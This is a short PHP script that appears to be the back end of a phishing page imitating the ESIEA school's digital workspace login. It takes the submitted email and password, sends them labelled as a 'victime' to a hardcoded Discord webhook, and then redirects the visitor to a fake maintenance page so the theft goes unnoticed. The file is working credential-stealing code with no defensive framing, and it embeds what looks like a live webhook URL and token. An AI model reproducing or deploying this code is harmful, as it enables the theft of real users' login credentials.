<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $data = array(
        "content" => "Connexion à Espace Numérique de Travail de l'ESIEA\n```Username: $email\nPassword: $password```",
        "username" => "victime #" . rand(0, 100000)
    );

    $options = array(
        "http" => array(
            "header"  => "Content-type: application/json\r\n",
            "method"  => "POST",
            "content" => json_encode($data)
        )
    );

    $context  = stream_context_create($options);
    $result = file_get_contents("https://discord.com/api/webhooks/1199663607286333460/jWA-PuxbU8C-E76X13aHK37hNIn4-ZP6k3-hbGK9SrdMNf5hTyAe65a1ViKyKfqg6nSg", false, $context);

    if ($result === FALSE) {
        /* Handle error */
    }

    header("Location: ../maintenance/maintenance.html");
    exit;
}
?>